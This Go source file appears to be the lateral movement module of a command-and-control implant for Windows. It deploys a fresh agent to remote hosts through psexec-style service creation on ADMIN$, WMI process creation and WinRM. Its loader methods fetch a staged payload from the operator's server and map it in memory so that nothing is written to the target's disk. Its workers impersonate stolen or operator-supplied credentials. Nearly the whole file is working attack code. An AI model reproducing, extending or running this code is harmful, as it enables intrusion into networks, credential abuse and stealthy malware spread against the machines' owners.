//go:build windows

package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

var (
	procOpenSCManagerW     = advapi32.NewProc("OpenSCManagerW")
	procOpenServiceW       = advapi32.NewProc("OpenServiceW")
	procCreateServiceW     = advapi32.NewProc("CreateServiceW")
	procStartServiceW      = advapi32.NewProc("StartServiceW")
	procDeleteService      = advapi32.NewProc("DeleteService")
	procCloseServiceHandle = advapi32.NewProc("CloseServiceHandle")
	procQueryServiceStatus = advapi32.NewProc("QueryServiceStatus")
)

const (
	scManagerAllAccess = 0xF003F
	serviceAllAccess   = 0xF01FF
	serviceDemandStart = 3
	serviceErrorIgnore = 0
)

// runLateralChild is the --lateral-child entry point. The whole move runs
// here so the parent command loop only waits for a bounded child process.
// Failures are printed to standard output (exit 0) so the parent passes the
// explanation back to the operator as command output.
func runLateralChild(args []string) error {
	if len(args) != 2 || args[0] != "--lateral-child" {
		return errors.New("lateral child requires a JSON payload argument")
	}
	var payload lateralPayload
	if err := json.Unmarshal([]byte(args[1]), &payload); err != nil {
		return fmt.Errorf("decode lateral payload: %w", err)
	}
	result, err := lateralMove(payload)
	if err != nil {
		fmt.Println("Lateral failed: " + err.Error())
		return nil
	}
	fmt.Println(result)
	return nil
}

func lateralMove(payload lateralPayload) (string, error) {
	return lateralMoveWithProgress(payload, nil)
}

// lateralMoveWithProgress deploys a fresh agent to the target and starts it
// with the requested execution method. Loader deployments (the server-sourced
// *_loader wire methods) stream a staged artifact through the target's
// powershell.exe and map it in memory, so the deployment works from any
// source hosting mode and writes no file to the target's disk: legacy wmiexec
// copies this binary over SMB, the legacy winrm path streams this binary
// over WSMan, and psexec stages its dedicated service host. Every network
// operation runs under the pinned worker's thread identity, which carries the
// active make_token credentials when one is set; without a token the move
// uses the agent's own identity and requires local admin rights on the
// target. The WinRM loader deployment loads the streamed executable in memory
// inside the receiver, so it lives only as long as the WinRM shell; the WMI
// loader deployment creates an independent receiver process. Non-loader WMI
// and psexec methods need embedded connection settings (base URL and beacon
// secret) because a service process inherits no operator environment; build
// them with the server's use_server_config option.
func lateralMoveWithProgress(payload lateralPayload, publish func(string)) (string, error) {
	// Guard on the real dependency instead of the hosting mode: loader
	// deployments stream a server-staged artifact and never touch this
	// binary, so a memory-hosted source may run them. Every legacy method
	// still copies or re-executes this binary and keeps refusing from an
	// in-memory host.
	if lateralUsesSelfBinary(payload) && memoryHosted() {
		return "", errMemoryHosted
	}
	parent := os.Getenv("RMM_SESSION_ID")
	if parent == "" {
		parent = "go"
	}
	targetSession := payload.SessionID
	if targetSession == "" {
		targetSession = derivedSessionID(parent, "lateral")
	}
	deadline := time.Now().Add(time.Duration(payload.TimeoutSeconds * float64(time.Second)))

	if payload.Method == "psexec" {
		serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
		if err != nil {
			return "", err
		}
		return lateralPsexecMove(payload, targetSession, serviceName, binaryName, publish)
	}

	switch payload.Method {
	case "wmiexec":
		if payload.loaderDeploy {
			// The loader path replaces the ADMIN$ copy: the receiver maps
			// the streamed artifact in memory, so no deployment file ever
			// reaches the target's disk.
			agent, err := lateralLoaderArtifact(payload, deadline)
			if err != nil {
				return "", err
			}
			if err := wmiLoaderMove(payload, targetSession, agent, deadline); err != nil {
				return "", err
			}
		} else {
			// Only legacy WMI uses SMB staging. WinRM and loader
			// deployments transfer through their own channels.
			self, err := os.Executable()
			if err != nil {
				return "", fmt.Errorf("resolve agent executable: %w", err)
			}
			serviceName, binaryName, err := lateralDeploymentNames(payload.RemoteName, rand.Reader)
			if err != nil {
				return "", err
			}
			sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
			if err := copyFile(self, sharePath); err != nil {
				return "", fmt.Errorf("stage agent on %s: %w", payload.Host, err)
			}
			localPath := `C:\Windows\System32\` + binaryName
			agentCommand := lateralAgentCommand(localPath, targetSession, payload.WorkspaceID, serviceName)
			if err := wmiCreateProcess(payload.Host, agentCommand, payload.winrmIdentity, payload.ambientToken, time.Until(deadline)); err != nil {
				// The staged executable belongs to this deployment only: remove it
				// instead of leaving an untracked artifact on the target.
				if rollbackErr := os.Remove(sharePath); rollbackErr != nil && !os.IsNotExist(rollbackErr) {
					return "", errors.Join(err, fmt.Errorf("rollback staged agent on %s: %w", payload.Host, rollbackErr))
				}
				return "", err
			}
		}
	case "winrm":
		if payload.loaderDeploy {
			agent, err := lateralLoaderArtifact(payload, deadline)
			if err != nil {
				return "", err
			}
			if payload.independentLifetime {
				if err := winrmDeployLoaderAgentIndependent(payload.Host, agent, targetSession, payload.WorkspaceID, payload.winrmIdentity, payload.HTTPS, payload.Insecure, deadline); err != nil {
					return "", err
				}
			} else if err := winrmDeployLoaderAgent(payload.Host, agent, targetSession, payload.WorkspaceID, payload.winrmIdentity, payload.HTTPS, payload.Insecure, deadline); err != nil {
				return "", err
			}
		} else {
			self, err := os.Executable()
			if err != nil {
				return "", fmt.Errorf("resolve agent executable: %w", err)
			}
			if err := winrmDeployAgent(payload.Host, self, targetSession, payload.WorkspaceID, payload.winrmIdentity, payload.HTTPS, payload.Insecure, deadline); err != nil {
				return "", err
			}
		}
	}
	ack := fmt.Sprintf("lateral started: method=%s host=%s target session=%s",
		payload.Method, payload.Host, targetSession)
	if payload.loaderDeploy {
		ack += " loader=" + payload.Loader
	}
	return ack, nil
}

// lateralLoaderArtifact fetches the server-staged deployment artifact for a
// loader move, bounded by the remaining deployment deadline. The bytes are
// the server-selected workspace build; this process's own image is never the
// deployed artifact.
func lateralLoaderArtifact(payload lateralPayload, deadline time.Time) ([]byte, error) {
	cfg, err := loadConfig()
	if err != nil {
		return nil, fmt.Errorf("load agent configuration for the staged payload: %w", err)
	}
	fetchTimeout := time.Until(deadline)
	if fetchTimeout <= 0 {
		return nil, errors.New("the deployment deadline expired before fetching the staged payload")
	}
	agent, err := lateralStageFetch(cfg, payload.Stage, payload.PayloadSHA256, fetchTimeout)
	if err != nil {
		return nil, fmt.Errorf("fetch the staged deployment payload from the server: %w", err)
	}
	return agent, nil
}

// lateralPsexecMove deploys the dedicated lateral service host the way
// RemCom and PsExec deploy their service: the compact binary is extracted
// from this agent's own body, staged on ADMIN$, and started as a
// demand-start service. Its linked stage1 worker fetches the masked stage2
// payload from the listener's staging endpoint, installs the agent, and
// stops. This caller then waits for successful service completion and
// removes the service and host binary itself; the server cleanup command
// is only a retry path when this immediate cleanup stays pending.
func lateralPsexecMove(payload lateralPayload, targetSession, serviceName, binaryName string, publish func(string)) (string, error) {
	startedAt := time.Now()
	cfg, err := loadConfig()
	if err != nil {
		return "", err
	}
	if !bytes.HasPrefix(embeddedLateralService, []byte("MZ")) {
		return "", errors.New("dedicated lateral service is not embedded: build the agent with MinGW through the server")
	}
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + binaryName
	if err := os.WriteFile(sharePath, embeddedLateralService, 0700); err != nil {
		return "", fmt.Errorf("stage lateral service on %s: %w", payload.Host, err)
	}
	localPath := `C:\Windows\System32\` + binaryName
	binPath := buildWindowsCmdLine(append([]string{localPath}, lateralServiceArguments(payload.Stage, targetSession, cfg.BaseURL, payload.WorkspaceID)...))
	// The service is not marked for deletion here; this caller removes it
	// below once the linked worker has completed successfully.
	handles, err := scmStartServiceRetained(payload.Host, serviceName, binPath, false)
	if err != nil {
		// SCM creation or startup failed before any cleanup ownership record
		// existed: remove the staged launcher now instead of leaving an
		// untracked artifact on the target. An unstarted service is already
		// marked for deletion inside scmStartServiceRetained.
		if rollbackErr := removeStoppedLauncher(sharePath); rollbackErr != nil && !os.IsNotExist(rollbackErr) {
			return "", errors.Join(err, fmt.Errorf("rollback staged launcher on %s: %w", payload.Host, rollbackErr))
		}
		return "", err
	}
	defer handles.close()
	ack := fmt.Sprintf("lateral started: method=psexec host=%s target session=%s service=%s binary=%s",
		payload.Host, targetSession, serviceName, binaryName)
	if publish != nil {
		publish(ack)
	}
	if err := waitStage1ServiceStopped(handles.service, time.Duration(payload.TimeoutSeconds*float64(time.Second))-time.Since(startedAt)); err != nil {
		var failed *launcherFailure
		if errors.As(err, &failed) {
			cleanup, cleanupErr := lateralCleanupStopped(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName}, handles.delete)
			if cleanupErr != nil {
				cleanup = "lateral cleanup pending: " + cleanupErr.Error()
			}
			return strings.Replace(ack, "lateral started:", "lateral failed:", 1) + "\n" + err.Error() + "\n" + cleanup, nil
		}
		return ack + "\nlateral cleanup pending: " + err.Error(), nil
	}
	cleanup, err := lateralCleanupStopped(lateralCleanupPayload{Host: payload.Host, ServiceName: serviceName, BinaryName: binaryName}, handles.delete)
	if err != nil {
		return ack + "\nlateral cleanup pending: " + err.Error(), nil
	}
	return ack + "\n" + cleanup, nil
}

// waitStage1Stopped observes only this deployment's service, never another agent.
// A successful service exit means stage1 created the new agent process.
func waitStage1Stopped(host, name string, timeout time.Duration) error {
	debugEvent("scm.wait_stopped.begin", nil)
	var machine *uint16
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return err
		}
		machine = pointer
	}
	debugEvent("scm.wait.open_manager.begin", nil)
	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machine)), 0, 1)
	if scm == 0 {
		debugEvent("scm.wait.open_manager.failed", callErr)
		return fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	debugEvent("scm.wait.open_manager.complete", nil)
	defer procCloseServiceHandle.Call(scm)
	serviceName, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return err
	}
	debugEvent("scm.wait.open_service.begin", nil)
	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(serviceName)), 4)
	if service == 0 {
		debugEvent("scm.wait.open_service.failed", callErr)
		return serviceLookupOutcome(callErr)
	}
	debugEvent("scm.wait.open_service.complete", nil)
	defer procCloseServiceHandle.Call(service)
	return waitStage1ServiceStopped(service, timeout)
}

// waitStage1ServiceStopped polls an existing handle without reconnecting to SCM.
func waitStage1ServiceStopped(service uintptr, timeout time.Duration) error {
	debugEvent("scm.wait_stopped.begin", nil)
	deadline := time.Now().Add(timeout)
	for {
		var status struct{ serviceType, state, accepted, exitCode, specificCode, checkpoint, waitHint uint32 }
		debugEvent("scm.wait.query_status.begin", nil)
		ok, _, queryErr := procQueryServiceStatus.Call(service, uintptr(unsafe.Pointer(&status)))
		if ok == 0 {
			debugEvent("scm.wait.query_status.failed", queryErr)
			return fmt.Errorf("query launcher service: %w", queryErr)
		}
		debugEvent("scm.wait.query_status.complete", nil)
		ready, err := launcherServiceOutcome(status.state, status.exitCode, status.specificCode)
		if err != nil || ready {
			debugEvent("scm.wait_stopped.complete", err)
			return err
		}
		if !time.Now().Before(deadline) {
			debugEvent("scm.wait_stopped.timeout", context.DeadlineExceeded)
			return errors.New("launcher service has not stopped; cleanup pending")
		}
		time.Sleep(100 * time.Millisecond)
	}
}

// closeSCMHandle exposes native close failures to retained-handle cleanup.
func closeSCMHandle(handle uintptr) error {
	debugEvent("scm.close_handle.begin", nil)
	ok, _, callErr := procCloseServiceHandle.Call(handle)
	if ok == 0 {
		debugEvent("scm.close_handle.failed", callErr)
		return fmt.Errorf("close SCM handle: %w", callErr)
	}
	debugEvent("scm.close_handle.complete", nil)
	return nil
}

// deleteSCMService marks the service referenced by an existing handle for deletion.
func deleteSCMService(handle uintptr) error {
	debugEvent("scm.delete_service.begin", nil)
	deleted, _, callErr := procDeleteService.Call(handle)
	if deleted == 0 {
		debugEvent("scm.delete_service.failed", callErr)
		return fmt.Errorf("delete service: %w", callErr)
	}
	debugEvent("scm.delete_service.complete", nil)
	return nil
}

// scmStartServiceRetained transfers the started service and manager handles to
// its caller. Errors close both handles; native calls stay on the pinned worker.
func scmStartServiceRetained(host, serviceName, binPath string, markForDeletion bool) (result *scmServiceHandles, resultErr error) {
	var machinePtr *uint16
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return nil, fmt.Errorf("encode host: %w", err)
		}
		machinePtr = pointer
	}
	// Convert inside Call so Go retains the hostname for the native call.
	debugEvent("scm.start.open_manager.begin", nil)
	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machinePtr)), 0, scManagerAllAccess)
	if scm == 0 {
		debugEvent("scm.start.open_manager.failed", callErr)
		return nil, fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	debugEvent("scm.start.open_manager.complete", nil)
	handles := &scmServiceHandles{manager: scm, closeHandle: closeSCMHandle, deleteService: deleteSCMService}
	retained := false
	defer func() {
		if !retained {
			resultErr = errors.Join(resultErr, handles.close())
		}
	}()
	namePtr, err := syscall.UTF16PtrFromString(serviceName)
	if err != nil {
		return nil, fmt.Errorf("encode service name: %w", err)
	}
	binPtr, err := syscall.UTF16PtrFromString(binPath)
	if err != nil {
		return nil, fmt.Errorf("encode service binary: %w", err)
	}
	service, _, callErr := procCreateServiceW.Call(
		scm,
		uintptr(unsafe.Pointer(namePtr)),
		uintptr(unsafe.Pointer(namePtr)),
		serviceAllAccess,
		serviceWin32OwnProcess,
		serviceDemandStart,
		serviceErrorIgnore,
		uintptr(unsafe.Pointer(binPtr)),
		0, 0, 0, 0, 0, 0,
	)
	if service == 0 {
		return nil, fmt.Errorf("create service on %s: %w", host, callErr)
	}
	handles.service = service
	started, _, callErr := procStartServiceW.Call(service, 0, 0)
	startErr := serviceStartOutcome(started != 0, callErr)
	if markForDeletion {
		procDeleteService.Call(service)
	} else if startErr != nil {
		// A created service that cannot start is an untracked artifact: mark
		// it for deletion while this handle still owns it, before the
		// deferred close releases the ownership needed for deletion.
		if deleted, _, deleteErr := procDeleteService.Call(service); deleted == 0 {
			debugEvent("scm.start.start_failed.delete_service.failed", deleteErr)
			startErr = errors.Join(startErr, fmt.Errorf("delete created service on %s: %w", host, deleteErr))
		} else {
			debugEvent("scm.start.start_failed.delete_service.complete", nil)
		}
	}
	if startErr != nil {
		return nil, fmt.Errorf("start service on %s: %w", host, startErr)
	}
	retained = true
	return handles, nil
}

// scmDeleteService removes a service on the target host; a missing service
// is reported as already removed.
func scmDeleteService(host, serviceName string) (bool, error) {
	debugEvent("scm.delete.begin", nil)
	var machinePtr *uint16
	if host != "" {
		pointer, err := syscall.UTF16PtrFromString(`\\` + host)
		if err != nil {
			return false, fmt.Errorf("encode host: %w", err)
		}
		machinePtr = pointer
	}
	// Convert inside Call so Go retains the hostname for the native call.
	debugEvent("scm.delete.open_manager.begin", nil)
	scm, _, callErr := procOpenSCManagerW.Call(uintptr(unsafe.Pointer(machinePtr)), 0, scManagerAllAccess)
	if scm == 0 {
		debugEvent("scm.delete.open_manager.failed", callErr)
		return false, fmt.Errorf("open SC manager on %s: %w", host, callErr)
	}
	debugEvent("scm.delete.open_manager.complete", nil)
	defer func() {
		debugEvent("scm.delete.close_manager.begin", nil)
		ok, _, closeErr := procCloseServiceHandle.Call(scm)
		if ok == 0 {
			debugEvent("scm.delete.close_manager.failed", closeErr)
		} else {
			debugEvent("scm.delete.close_manager.complete", nil)
		}
	}()
	namePtr, err := syscall.UTF16PtrFromString(serviceName)
	if err != nil {
		return false, fmt.Errorf("encode service name: %w", err)
	}
	debugEvent("scm.delete.open_service.begin", nil)
	service, _, callErr := procOpenServiceW.Call(scm, uintptr(unsafe.Pointer(namePtr)), serviceAllAccess)
	if service == 0 {
		debugEvent("scm.delete.open_service.failed", callErr)
		return false, serviceLookupOutcome(callErr)
	}
	debugEvent("scm.delete.open_service.complete", nil)
	defer func() {
		debugEvent("scm.delete.close_service.begin", nil)
		ok, _, closeErr := procCloseServiceHandle.Call(service)
		if ok == 0 {
			debugEvent("scm.delete.close_service.failed", closeErr)
		} else {
			debugEvent("scm.delete.close_service.complete", nil)
		}
	}()
	debugEvent("scm.delete_service.begin", nil)
	deleted, _, callErr := procDeleteService.Call(service)
	if deleted == 0 {
		debugEvent("scm.delete_service.failed", callErr)
		return false, fmt.Errorf("delete service on %s: %w", host, callErr)
	}
	debugEvent("scm.delete_service.complete", nil)
	return true, nil
}

// runLateralCleanupChild is the --lateral-cleanup-child entry point: it
// removes the psexec deployment artifacts on the target. Failures print to
// standard output (exit 0) so the parent passes the explanation back.
func runLateralCleanupChild(args []string) error {
	if len(args) != 2 || args[0] != "--lateral-cleanup-child" {
		return errors.New("lateral cleanup child requires a JSON payload argument")
	}
	var payload lateralCleanupPayload
	if err := json.Unmarshal([]byte(args[1]), &payload); err != nil {
		return fmt.Errorf("decode lateral cleanup payload: %w", err)
	}
	result, err := lateralCleanup(payload)
	if err != nil {
		fmt.Println("Lateral cleanup failed: " + err.Error())
		return nil
	}
	fmt.Println(result)
	return nil
}

// lateralCleanup deletes the temporary launcher service and its host
// binary on the target. It first waits for the linked stage1 worker to
// finish, so a still-running deployment is never deleted underneath itself.
func lateralCleanup(payload lateralCleanupPayload) (string, error) {
	debugEvent("lateral.cleanup.begin", nil)
	if err := waitStage1Stopped(payload.Host, payload.ServiceName, 15*time.Second); err != nil {
		var failed *launcherFailure
		if !errors.As(err, &failed) {
			return "", err
		}
	}
	return lateralCleanupStopped(payload, func() (bool, error) {
		return scmDeleteService(payload.Host, payload.ServiceName)
	})
}

// lateralCleanupStopped removes artifacts after a caller has established that
// the worker stopped. The deletion callback can reuse the original SCM handle.
func lateralCleanupStopped(payload lateralCleanupPayload, deleteService func() (bool, error)) (string, error) {
	debugEvent("lateral.cleanup.begin", nil)
	serviceDeleted, serviceErr := deleteService()
	debugEvent("lateral.cleanup.service_delete.returned", serviceErr)
	sharePath := `\\` + payload.Host + `\ADMIN$\System32\` + payload.BinaryName
	debugEvent("lateral.cleanup.remove_file.begin", nil)
	fileErr := removeStoppedLauncher(sharePath)
	debugEvent("lateral.cleanup.remove_file.returned", fileErr)
	var detail strings.Builder
	if serviceErr != nil {
		fmt.Fprintf(&detail, "service error (%v)", serviceErr)
	} else if serviceDeleted {
		detail.WriteString("service deleted")
	} else {
		detail.WriteString("service not found or already removed")
	}
	switch {
	case fileErr == nil:
		detail.WriteString("; launcher binary removed from ADMIN$")
	case os.IsNotExist(fileErr):
		detail.WriteString("; launcher binary not found on ADMIN$")
	default:
		fmt.Fprintf(&detail, "; launcher binary still on ADMIN$ (%v)", fileErr)
	}
	output, err := lateralCleanupOutcome(detail.String(), serviceErr, fileErr)
	debugEvent("lateral.cleanup.complete", err)
	if err == nil {
		lateralCleanupOwners.Lock()
		delete(lateralCleanupOwners.artifacts, payload)
		lateralCleanupOwners.Unlock()
	}
	return output, err
}

// removeStoppedLauncher tolerates the brief image-handle close after SCM stop.
func removeStoppedLauncher(path string) error {
	err := os.Remove(path)
	deadline := time.Now().Add(5 * time.Second)
	for (errors.Is(err, syscall.Errno(32)) || errors.Is(err, syscall.ERROR_ACCESS_DENIED)) && time.Now().Before(deadline) {
		time.Sleep(100 * time.Millisecond)
		err = os.Remove(path)
	}
	return err
}

// lateralThreadGoroutine runs lateral methods on a goroutine with a locked OS thread
// so ImpersonateLoggedOnUser applies the captured dispatch-time token to the
// ADMIN$ write and native execution calls. This avoids CreateProcessAsUserW and
// its SE_ASSIGNPRIMARYTOKEN_PRIVILEGE requirement: thread impersonation with a
// LOGON_NEW_CREDENTIALS token covers all outbound network auth without any
// special agent privileges.
//
// The goroutine's thread impersonation is independent of the main goroutine's
// thread token; the main goroutine's impersonation state is not affected.
func lateralThreadGoroutine(ctx context.Context, payload lateralPayload) (string, error) {
	return runLateralThreadWithCleanup(ctx, payload, lateralMoveWithProgress, clearLateralWorkerIdentity, func() {
		releaseLateralHost(payload.Host)
	})
}

// runLateralThread scopes impersonation to a pinned worker. The injected move
// supports local identity tests without remote execution.
func runLateralThread(ctx context.Context, payload lateralPayload, move func(lateralPayload, func(string)) (string, error)) (string, error) {
	return runLateralThreadWithCleanup(ctx, payload, move, clearLateralWorkerIdentity, nil)
}

// clearLateralWorkerIdentity removes impersonation before thread reuse.
func clearLateralWorkerIdentity() error {
	if ok, _, err := procRevertToSelf.Call(); ok == 0 {
		return fmt.Errorf("clear worker thread token: %w", err)
	}
	return nil
}

// runLateralThreadWithCleanup keeps final completion behind identity cleanup;
// the cleanup seam permits failure and ordering tests without corrupting tokens.
// workerDone runs inside the pinned worker's deferred completion, so a claim
// or other per-host reservation is released exactly once the native work has
// finished, even when the caller already returned on its own deadline.
func runLateralThreadWithCleanup(ctx context.Context, payload lateralPayload, move func(lateralPayload, func(string)) (string, error), clearIdentity func() error, workerDone func()) (string, error) {
	if workerDone == nil {
		workerDone = func() {}
	}
	if err := ctx.Err(); err != nil {
		workerDone()
		return "", err
	}
	token, identity, err := captureLateralWorkerIdentity(payload)
	if err != nil {
		workerDone()
		return "", err
	}
	payload.winrmIdentity = identity
	payload.ambientToken = uintptr(token)
	ch := make(chan lateralResult, 1)
	progress := make(chan string, 1)
	go func() {
		runtime.LockOSThread()
		result := lateralResult{}
		debugEvent("lateral.worker.start", nil)
		defer func() {
			if workerDone != nil {
				workerDone()
			}
			debugEvent("lateral.worker.revert_identity.begin", nil)
			if identity != nil {
				*identity = winrmCredentials{}
			}
			err := clearIdentity()
			if token != 0 {
				_ = token.Close()
			}
			if err != nil {
				result.err = errors.Join(result.err, identityBoundaryFailure(err))
				result.result = ""
				ch <- result
				// Exiting while pinned makes the Go runtime discard this thread.
				return
			}
			debugEvent("lateral.worker.revert_identity.complete", nil)
			runtime.UnlockOSThread()
			debugEvent("lateral.worker.stop", nil)
			ch <- result
		}()
		// Use the dispatch-time token even if the main thread later replaces
		// or revokes its active token while this worker is starting.
		if token != 0 {
			if ok, _, err := procImpersonateLoggedOnUser.Call(uintptr(token)); ok == 0 {
				result.err = identityBoundaryFailure(fmt.Errorf("apply worker thread token: %w", err))
				return
			}
		}
		debugEvent("lateral.worker.apply_identity.returned", nil)
		if identityBoundaryFault.Load() {
			result.err = errIdentityUnsafe
			return
		}
		if err := ctx.Err(); err != nil {
			result.err = err
			return
		}
		result.result, result.err = move(payload, func(ack string) {
			rememberLateralCleanup(payload, ack)
			progress <- ack
		})
	}()
	return awaitLateralResult(ctx, ch, progress)
}

// captureLateralToken owns a duplicate of the dispatch-time token so replacing
// or closing the main thread's handle cannot change a queued worker's identity.
func captureLateralToken() (syscall.Token, error) {
	token, _, err := captureLateralIdentity(false)
	return token, err
}

// captureLateralWorkerIdentity selects the worker's identity for one
// deployment. Operator-supplied credentials in the payload take precedence:
// they log on as a network-only token (no privilege required) so both the
// thread impersonation for SMB staging and the explicit credential plumbing
// of the WMI and WinRM chains carry them. Without them the ambient make_token
// state remains the fallback, unchanged: a make_token stays the ambient
// (cloaked) identity for wmiexec by design — only a forced identity may
// hand the WMI chain explicit credentials.
func captureLateralWorkerIdentity(payload lateralPayload) (syscall.Token, *winrmCredentials, error) {
	if payload.Identity != nil {
		return captureLateralExplicitIdentity(winrmCredentials{
			domain: payload.Identity.Domain, user: payload.Identity.User, password: payload.Identity.Password,
		})
	}
	return captureLateralIdentity(payload.Method == "winrm")
}

// captureLateralExplicitIdentity creates a LOGON32_LOGON_NEW_CREDENTIALS
// token from operator-supplied credentials. The logon type does not validate
// the password, matching make_token semantics; the worker thread impersonates
// the returned token while the WMI chain also receives the credentials
// explicitly at ConnectServer and the proxy blanket, and the WinRM chain
// passes them to WSManCreateSession. Credential material never appears in
// the returned error text.
func captureLateralExplicitIdentity(creds winrmCredentials) (syscall.Token, *winrmCredentials, error) {
	userPtr, err := syscall.UTF16PtrFromString(creds.user)
	if err != nil {
		return 0, nil, errors.New("encode lateral identity user")
	}
	domainPtr, err := syscall.UTF16PtrFromString(creds.domain)
	if err != nil {
		return 0, nil, errors.New("encode lateral identity domain")
	}
	passwordPtr, err := syscall.UTF16PtrFromString(creds.password)
	if err != nil {
		return 0, nil, errors.New("encode lateral identity password")
	}
	var handle syscall.Handle
	result, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(logonNewCredentials),
		uintptr(logonProviderWinNT32),
		uintptr(unsafe.Pointer(&handle)),
	)
	runtime.KeepAlive(passwordPtr)
	if result == 0 {
		return 0, nil, fmt.Errorf("LogonUserW for lateral identity: %w", callErr)
	}
	return syscall.Token(handle), &creds, nil
}

// captureLateralIdentity captures token and optional WinRM credentials under
// one lock so an intervening make_token cannot mix identities between protocols.
func captureLateralIdentity(includeCredentials bool) (syscall.Token, *winrmCredentials, error) {
	tokenMu.Lock()
	defer tokenMu.Unlock()
	if identityBoundaryFault.Load() {
		return 0, nil, errIdentityUnsafe
	}
	if !tokenActive || activeToken == 0 {
		return 0, nil, nil
	}
	var handle syscall.Handle
	process := syscall.Handle(^uintptr(0))
	if err := syscall.DuplicateHandle(process, syscall.Handle(activeToken), process, &handle, 0, false, 2); err != nil {
		return 0, nil, fmt.Errorf("capture lateral worker token: %w", err)
	}
	var identity *winrmCredentials
	if includeCredentials {
		copy := spawnCredentials
		identity = &copy
	}
	return syscall.Token(handle), identity, nil
}
